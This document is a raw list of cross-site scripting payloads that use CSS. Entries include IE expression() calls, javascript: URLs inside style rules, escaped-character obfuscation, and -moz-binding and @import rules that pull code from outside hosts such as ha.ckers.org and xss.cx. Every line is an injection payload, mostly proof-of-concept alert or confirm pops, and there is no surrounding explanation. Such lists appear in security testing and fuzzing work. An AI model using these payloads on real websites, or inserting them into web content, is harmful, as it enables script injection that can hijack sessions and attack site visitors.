width:expression(if(!window.done)alert(1),window.done=1)
expression(window.x?0:(confirm(7),window.x=1))
background-image:url(https://s1.yimg.com/rz/l/yahoo_en-US_b_w_26x14_2x.png)
behaviour:url\0028javascript:confirm\0028[0][0]\0029\0029
/*@cc_on @if(1)confirm(1)@end
}*{color:#ccc;}
"; ||confirm('XSS') || "
<// style=x:expression\28write(1)\29> 
<STYLE TYPE="text/javascript">confirm(document.location);</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:confirm(document.location)")}</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>.XSS{background-image:url("javascript:confirm(document.location)");}</STYLE><A CLASS=XSS></A>
<STYLE>@import'http://xss.cx/xss.css';</STYLE>
<XSS STYLE="xss:expression(confirm(document.location))">
<style>*{display:table; border:10px solid red;}</style>
<title onmouseover="alert(1)">hover me</title>
%0A{}*{color:red;}
%0A%0D{}*{color:red;}
%0a{}*{background:red}
expression(alert(document.domain))
{}%0a@import"//xss.cx?